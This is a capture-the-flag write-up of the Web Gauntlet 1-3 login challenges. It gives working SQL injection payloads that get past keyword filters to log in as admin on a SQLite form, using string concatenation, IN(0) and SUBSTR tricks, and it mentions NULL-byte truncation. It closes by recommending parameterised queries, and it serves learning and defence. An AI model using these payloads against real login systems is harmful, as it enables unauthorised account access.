# Web Gauntlet (1-3)

So this time we have a login form, we want to login as `admin` without knowing the password.

And it has a filter - your input cannot contain these words.

Example for Web Gauntlet 1 's Round 5 filter:

`Round5: or and = like > < -- union admin`

Round1 only contains `or` so we need to learn more tricks to by pass it.

All the filters:

```text
Round1: or
Round2: or and like = --
# RIP, no more --, luckily we still have /* in SQLite...
Round3: or and = like > < --
# From source code it bans spaces are well...
Round4: or and = like > < -- admin
Round5: or and = like > < -- union admin
```

The SQL statement

```SQL
SELECT * FROM users WHERE username='(user name)' AND password='(password)'
```

My input as username to pass all rounds: `adm'||'in'/*`

## The very hard mode

Try to increase the difficult (or follow the author's original intent) by adding these constraints to myself.

Round 2: No like, = , --, ; , and /**/ too (Totally no comment, no ; to skip statement)
And try to use the newly banned syntax from Round 3: > <

Round 3-4: Use union

Round 5: No /* (really do it the hard way)

### Solution

Round 2: username = `admin`, password = `bocchi'<>'`

SQL statement:

```SQL
SELECT * FROM users WHERE username='admin' AND password='bocchi'<>''

-- <> is not equal for string, we compare empty string != some string
```

Round 3: username = `admin`, password = `'IN(0)||'`
Round 4-5: username = `ad'||'min`, same password as above

SQL statement:

```SQL
-- password='whatevervalue' is 0
SELECT * FROM users WHERE username='admin' AND password=''IN(0)||''

-- don't know why False doesn't work in CTF but works in the online SQLite server I found
SELECT * FROM users WHERE username='admin' AND password=''IN(False)||''

```

The trick is to concat an empty string to consume the last `'` and make the password part true.

This works for all Round 3-5 and Web Gauntlet 2,3. (Of course, the admin needs to be concat'ed)

If `UNION` needs to be used, I think `/**/` cannot be disabled since there must be spaces in UNION statements...

## Web Gauntlet 2,3

Same old SQL statement as 1.

Filter this time: `or and true false union like = > < ; -- /* */ admin (but space is allowed)`

### My solution for 2

Original SQL statement

```SQL
SELECT username, password FROM users WHERE username='(user name)' AND password='(password)'

-- we have to add the user name and password. The quotes cannot be deleted
```

The statement after injection

```SQL
SELECT username, password FROM users WHERE username='ad'||SUBSTR('min'||' AND password=',1,3)||''
```

username = `ad'||SUBSTR('min'||`
pw = `,1,3)||'`

This solution avoids the filter of `admin`. Then remove the `AND` part by turning the it to part of the string. This is the same as `'ad'||'min'||'(nothing)'`

### Solution for 3

This time they wants less than 25 letters in both username and password ... I have to save some spaces by using the 'a' in p'a'ssword provided from the statement. ('d' works too)

```SQL
SELECT username, password FROM users WHERE username=''||SUBSTR(' AND password=',7,1)||'dmin'  -- use the a from p'a'ssword

SELECT username, password FROM users WHERE username='ad'||SUBSTR(' AND password=',0,0)||'min' -- Skip all the password statement with SUBSTR('str',0,0). This seems better, not dependent on the content of statement
```

This works: (use the a in statement)
username = `'||SUBSTR(`
pw = `,7,1)||'dmin`

This works too:
username = `ad'||SUBSTR(`
pw = `,0,0)||'min`

## Some other ways to solve

I heard that adding NULL bytes to the query works too as the lower level string processor will skip everything after reading NULL byte (0x00). (Nice good-old C string)

## Lesson learnt

Don't try to manually filter for SQL injection - use parametized input instead.

I suppose if injection works, we probably don't need to do all these hard ways to by-pass these guards...right?

Injection means the code allows users to run arbitrary SQL statements by coding all those `+` to join strings or string formatting like `"SELECT user from ... {} ...".format(user_name, password)`
